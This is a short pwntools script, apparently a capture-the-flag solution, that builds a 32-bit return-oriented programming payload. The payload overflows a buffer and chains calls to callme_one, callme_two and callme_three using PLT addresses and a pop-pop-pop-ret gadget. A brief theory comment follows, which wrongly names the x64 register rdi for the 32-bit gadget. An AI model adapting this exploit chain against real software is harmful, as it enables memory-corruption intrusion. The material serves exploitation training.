#python callme-32.py | ./callme32 
from pwn import *

payload = "A" *44

payload += p32(0x80485c0) ## address of callme_one@plt

payload += p32(0x080488a9) ## address of gadget pop esi; pop edi; pop ebp; ret;

payload += p32(1) + p32(2) + p32(3) ## arguments

payload += p32(0x8048620) ##address of callme_two@plt

payload += p32(0x080488a9) ## address of gadget pop esi; pop edi; pop ebp; ret;

payload += p32(1) + p32(2) + p32(3) ## arguments

payload += p32(0x80485b0) ## address of callme_three@plt

payload += "AAAA"

payload += p32(1) + p32(2) + p32(3) ## arguments

print payload

### THEORY 

"""
We need to adjust the stack to make sure that the arguments are removed from the stack to make sure that the return from the call should be to the correct address and not to the args on the stack so we used gadgets like pop rdi which would remove the value from the top of the 
stack into the register and then return to the stack.
Stack should look like -> https://github.com/rudrapwn/binary-exploitation/blob/master/screenshots/rop-callme32.png?raw=true
"""
